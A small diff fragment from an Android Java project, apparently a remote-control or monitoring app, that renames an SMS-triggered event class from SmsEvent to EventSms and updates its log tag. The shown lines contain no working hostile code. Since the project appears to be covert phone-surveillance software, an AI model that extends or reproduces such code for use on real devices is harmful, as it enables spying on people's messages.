@@ -10,9 +10,9 @@ import com.ht.RCSAndroidGUI.listener.ListenerSms;
 import com.ht.RCSAndroidGUI.util.DataBuffer;
 import com.ht.RCSAndroidGUI.util.WChar;
 
-public class SmsEvent extends EventBase implements Observer<Sms> {
+public class EventSms extends EventBase implements Observer<Sms> {
 	/** The Constant TAG. */
-	private static final String TAG = "SmsEvent";
+	private static final String TAG = "EventSms";
 
 	private int actionOnEnter;
 	private String number, msg;
